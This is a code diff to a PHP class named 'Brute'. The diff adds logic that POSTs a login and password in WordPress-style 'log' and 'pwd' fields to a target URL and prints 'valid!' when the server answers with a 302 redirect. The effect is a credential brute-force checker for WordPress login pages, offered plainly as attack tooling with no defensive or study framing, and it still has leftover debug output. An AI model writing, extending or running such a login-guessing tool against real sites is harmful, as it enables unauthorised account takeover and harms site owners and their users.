@@ -1,10 +1,9 @@
 <?php
 
-
 namespace app;
 
-
 use Amp\Dns\DnsException;
+use Amp\Http\Client\Body\FormBody;
 use Amp\Http\Client\HttpClientBuilder;
 use Amp\Http\Client\Request;
 
@@ -30,10 +29,21 @@ class Brute
         $this->password = $data['password'];
         $this->url = explode(';', $data['url'])[0];
 
+        $body = new FormBody;
+        $body->addField('log', $this->login);
+        $body->addField('pwd', $this->password);
 
-        $request = new Request($this->url);
+        $request = new Request($this->url, 'POST');
         $request->setTcpConnectTimeout(2400);
-        
+        $request->setBody($body);
+
+        $response = yield $this->client->request($request);
+
+        echo $response->getStatus() . PHP_EOL;
+
+        if ($response->getStatus() == 302) {
+            echo "valid!" . PHP_EOL;
+        }
 
 
 
@@ -56,8 +66,6 @@ class Brute
 
         $response = yield $this->client->request($request);
 
-        print_r($originalResponse);die;
-
-
+        print_r($response);die;
     }
 }
